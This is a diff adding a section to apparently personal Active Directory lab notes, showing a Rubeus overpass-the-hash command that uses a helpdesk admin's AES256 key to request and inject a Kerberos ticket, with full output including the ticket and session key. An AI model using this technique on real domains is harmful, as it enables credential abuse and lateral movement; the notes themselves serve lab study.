@@ -80,7 +80,70 @@ Description    :
 
 ## Compromise machine
 
+Request Kerberos TGT, for helpdesk admin
 ```
+C:\AD\Tools\Rubeus.exe asktgt /domain:us.techcorp.local /user:helpdeskadmin /aes256:f3ac0c70b3fdb36f25c0d5c9cc552fe9f94c39b705c4088a2bb7219ae9fb6534 /opsec /createonly:C:\Windows\System32\cmd.exe /show /ptt
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.1
+
+[*] Action: Ask TGT
+
+[*] Using domain controller: US-DC.us.techcorp.local (192.168.1.2)
+[!] Pre-Authentication required!
+[!]     AES256 Salt: US.TECHCORP.LOCALhelpdeskadmin
+[*] Using aes256_cts_hmac_sha1 hash: f3ac0c70b3fdb36f25c0d5c9cc552fe9f94c39b705c4088a2bb7219ae9fb6534
+[*] Building AS-REQ (w/ preauth) for: 'us.techcorp.local\helpdeskadmin'
+[*] Using domain controller: 192.168.1.2:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      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
+      EVVTLlRFQ0hDT1JQLkxPQ0FM
+[+] Ticket successfully imported!
+
+  ServiceName              :  krbtgt/US.TECHCORP.LOCAL
+  ServiceRealm             :  US.TECHCORP.LOCAL
+  UserName                 :  helpdeskadmin
+  UserRealm                :  US.TECHCORP.LOCAL
+  StartTime                :  2/27/2023 12:05:39 PM
+  EndTime                  :  2/27/2023 10:05:39 PM
+  RenewTill                :  3/6/2023 12:05:39 PM
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  KeyType                  :  aes256_cts_hmac_sha1
+  Base64(key)              :  Ayo7g2rahNEEg2Noe5j5D272H3uPYdttZvf8RIx1a/c=
+  ASREP (key)              :  F3AC0C70B3FDB36F25C0D5C9CC552FE9F94C39B705C4088A2BB7219AE9FB6534
+
 ```
 
 ## Extract secrets
